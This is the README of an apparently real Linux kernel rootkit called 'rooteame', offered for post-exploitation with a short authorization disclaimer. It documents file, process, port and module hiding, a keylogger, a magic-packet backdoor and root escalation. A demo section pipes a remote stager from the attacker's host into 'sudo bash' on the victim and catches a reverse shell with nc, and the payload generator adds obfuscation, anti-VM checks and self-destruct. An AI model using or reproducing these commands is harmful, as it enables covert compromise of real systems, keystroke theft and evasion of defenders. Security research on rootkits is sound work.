# rooteame — Linux Kernel Rootkit

Post-explotación profesional. Persistencia, ocultación y control kernel-level para red team y security research.

ruby570bocadito © 2026 — MIT License

---

## Qué hace

| Feature | Técnica |
|---------|----------|
| **Ocultar archivos/dirs** | Hook `getdents64` + `openat` + `unlinkat` — desaparecen de `ls`, `find`, `stat` |
| **Ocultar procesos** | Filtrado PIDs numéricos en `/proc` — no aparecen en `ps`, `top`, `htop` |
| **Ocultar puertos** | Filtrado de `/proc/net/tcp*` y `/proc/net/udp*` — invisible en `netstat`, `ss` |
| **Keylogger kernel** | Keyboard notifier chain — captura teclas antes de que lleguen a X11/Wayland |
| **Reverse shell** | `call_usermodehelper()` via workqueue — sin tocar disco, sin fork visible |
| **Backdoor sin puerto** | Magic packet via `kill()` — no requiere puerto abierto |
| **Escalar a root** | Manipulación directa de `cred` del proceso — root instantáneo |
| **Ocultar el módulo** | `list_del` de module list + `kobject_del` — invisible en `lsmod` |

---

## Demo rápida (30s)

```bash
# Terminal 1 — atacante (tu máquina)
cd rooteame/payloads
python3 payload.py                  # genera bash_stager.sh
python3 -m http.server 8080 &       # sirve el payload
nc -lvnp 4444                       # listener para la shell

# Terminal 2 — víctima (VM Linux)
curl -s http://TU_IP:8080/bash_stager.sh | sudo bash
```

Resultado: rootkit compilado, cargado, oculto de `lsmod`, shell reversa activa, persistencia instalada. El dropper se autoborra.

---

## Quick start (manual)

```bash
# 1. Dependencias
sudo apt install build-essential linux-headers-$(uname -r) golang-go

# 2. Compilar kernel module
cd src && make

# 3. Cargar
sudo insmod rooteame.ko

# 4. Compilar cliente Go
cd ../client/go && go build -o rooteame ./cmd/rooteame/

# 5. Usar
sudo ./rooteame give-root            # root instantáneo
sudo ./rooteame hide-file mal.sh     # ocultar archivo
sudo ./rooteame hide-pid 1337        # ocultar proceso
sudo ./rooteame hide-port 4444       # ocultar puerto
sudo ./rooteame hide-module          # ocultar rootkit de lsmod
sudo ./rooteame shell 10.0.0.5:1337  # reverse shell
sudo ./rooteame keylog               # leer teclas capturadas
sudo ./rooteame list                 # ver todo lo oculto
```

---

## Payloads

```bash
# Generador interactivo
python3 payloads/payload.py

# O por CLI
python3 payloads/payload.py --host TU_IP --port 4444 --format all
```

| Formato | Tamaño | Sin deps | Persistencia | Anti-VM |
|---------|--------|----------|-------------|---------|
| Bash dropper | ~19KB | No (necesita gcc) | systemd + rc.local | 5 checks |
| Python stager | ~0.8KB | Python 3 | No | No |
| C stager | ~4KB src → ~15KB bin | Solo libc | No | sleep guard |

Cada payload: XOR ofuscación (bash), logging camuflado (syslog), self-destruct, User-Agent Firefox.

---

## Arquitectura

```
rooteame/
├── src/          11 archivos C   → kernel module (.ko)
│   ├── main.c        init/exit, sys_call_table find, WP bypass
│   ├── hooking.c     install/remove hooks + RCU sync
│   ├── file_hide.c   getdents64/getdents/openat/unlinkat hooks
│   ├── proc_hide.c   PID hiding + kill hook (magic backdoor)
│   ├── net_hide.c    /proc/net/* filtering via read hook
│   ├── keylogger.c   keyboard notifier chain
│   ├── backdoor.c    reverse shell + magic packet trigger
│   ├── priv_esc.c    give_root via cred manipulation
│   ├── stealth.c     hide from lsmod + kobject_del
│   ├── ioctl.c       /dev/rooteame char device
│   ├── core.h        headers + ioctl constants
│   └── Makefile
│
├── client/
│   ├── rooteame_cli.py   Python CLI (legacy)
│   └── go/               Go CLI (primary, 0 deps)
│       ├── cmd/rooteame/main.go   14 comandos
│       └── internal/ioctl/       ioctl + unit tests
│
├── payloads/
│   ├── payload.py     generador interactivo (3 formatos)
│   └── builder.sh     wrapper CLI
│
├── docker/
│   ├── Dockerfile.build           build env
│   ├── docker-compose.yml         build service
│   ├── docker-compose.test.yml    red de test 3 nodos
│   ├── build.sh / test.sh         wrappers
│   └── out/                       .ko compilado
│
├── tests/
│   └── integration.sh   7 tests automatizados
│
├── brain/               documentación de arquitectura
├── Makefile             build unificado
└── README.md
```

---

## Comandos CLI (Go)

```bash
rooteame status              # ¿está cargado?
rooteame give-root [pid]     # root a un proceso
rooteame hide-file <name>    # ocultar archivo/directorio
rooteame unhide-file <name>  # revelar
rooteame hide-pid <pid>      # ocultar proceso
rooteame unhide-pid <pid>    # revelar
rooteame hide-port <port>    # ocultar puerto
rooteame unhide-port <port>  # revelar
rooteame list                # ver todo lo oculto
rooteame shell <ip:port>     # reverse shell
rooteame magic <word>        # activar backdoor sin puerto
rooteame keylog              # leer keylogger
rooteame keylog-clear        # limpiar buffer
rooteame hide-module         # ocultar de lsmod
rooteame unhide-module       # hacer visible
```

---

## Testing

```bash
# Unit tests Go (15 tests)
cd client/go && go test ./... -v

# Integration tests (requiere VM con módulo cargado)
sudo bash tests/integration.sh

# Docker build + test network
bash docker/build.sh          # compila .ko en contenedor
bash docker/test.sh up        # levanta red de 3 nodos
docker exec -it rooteame-attacker bash  # interactuar
bash docker/test.sh down      # limpiar
```

---

## Compatibilidad

| Kernel | Estado |
|--------|--------|
| 5.4 — 5.6 | kallsyms_lookup_name exportado |
| 5.7 — 5.x | kprobe fallback |
| 6.0 — 6.6+ | class_create() adaptado |
| WSL2 | No soportado (sin headers) |

---

## Stack

| Componente | Tecnología |
|-----------|-----------|
| Kernel module | C (Kbuild) |
| Userland client | Go 1.26 (0 deps) |
| Payload builder | Python 3 |
| Testing | Go testing + Bash |
| Containerización | Docker + Compose |

---

## Disclaimer

Herramienta para uso exclusivo en sistemas propios o con autorización explícita por escrito. El mal uso puede violar leyes locales, estatales y federales.

---

## License

MIT — Copyright (c) 2026 ruby570bocadito
